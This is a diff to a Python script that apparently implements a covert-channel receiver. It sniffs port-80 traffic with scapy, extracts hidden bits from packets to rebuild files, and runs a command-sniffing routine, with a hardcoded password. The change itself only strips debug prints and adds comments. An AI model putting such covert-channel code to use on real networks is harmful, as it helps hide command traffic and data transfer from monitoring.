@@ -18,6 +18,8 @@ password = "TEST!"
 authentication = "TEST!"
 localIP = "192.168.0.6"
 messages = []
+
+
 #Encrypt the message
 def encrypt(message):
     global encryptionKey
@@ -378,14 +380,10 @@ def receiveFile(packet):
                     addToMessages(messages, UID, total, covertContent)
                     # After every add, check if the max has been reached
                     if(checkCommands(UID)):
-                        #DEBUG: print "Max reached, reconstruct command"
                         newFile = writeFile(UID)
-                        #print "HERE MUHAHAHAHAHAHA"
-                        #print "File " + str(newFile) + " has been saved"
 
 def writeFile(UID):
     for element in messages:
-        # print element
         text = ""
         bits = ""
         fileName = ""
@@ -395,7 +393,6 @@ def writeFile(UID):
             for value in data:
                 text += str(value)
                 pass
-            # print text
             #Split into chunks of 8
             line = text
             n = 8
@@ -451,8 +448,8 @@ def sniffFile():
     sniff(filter="ip and dst port 80", prn=receiveFile)
 
 if __name__ == "__main__":
-
+    #Create second process
     fileProcess = Process(target=sniffFile)
     fileProcess.start()
-
+    #Run in main process
     sniffCommand()
